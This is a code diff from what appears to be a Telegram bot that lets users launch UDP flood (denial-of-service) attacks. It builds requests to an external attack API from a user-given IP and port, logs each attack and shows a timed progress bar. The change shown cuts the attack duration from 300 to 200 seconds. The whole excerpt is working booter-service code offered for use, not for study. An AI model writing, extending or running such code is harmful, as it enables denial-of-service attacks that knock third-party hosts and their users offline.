@@ -70,7 +70,7 @@ def create_progress_bar(current, total, length=20):
     return bar, percentage
 
 # ==================== ATTACK FUNCTION (RUNS IN BACKGROUND) ====================
-async def run_attack_timer(update: Update, ip: str, port: str, attack_link: str, attack_duration: int = 300):
+async def run_attack_timer(update: Update, ip: str, port: str, attack_link: str, attack_duration: int = 200):
     """Background task for attack timer"""
     
     # Progress message start
@@ -193,10 +193,10 @@ async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Generate attack link
-    attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=300&method=udp"
+    attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=200&method=udp"
     
     # Log save karo
-    log_attack(user_id, ip, port, 300, 'udp', attack_link)
+    log_attack(user_id, ip, port, 200, 'udp', attack_link)
     
     # Send confirmation
     await update.message.reply_text(
@@ -209,7 +209,7 @@ async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     # Start timer in background (non-blocking)
-    asyncio.create_task(run_attack_timer(update, ip, port, attack_link, 300))
+    asyncio.create_task(run_attack_timer(update, ip, port, attack_link, 200))
 
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
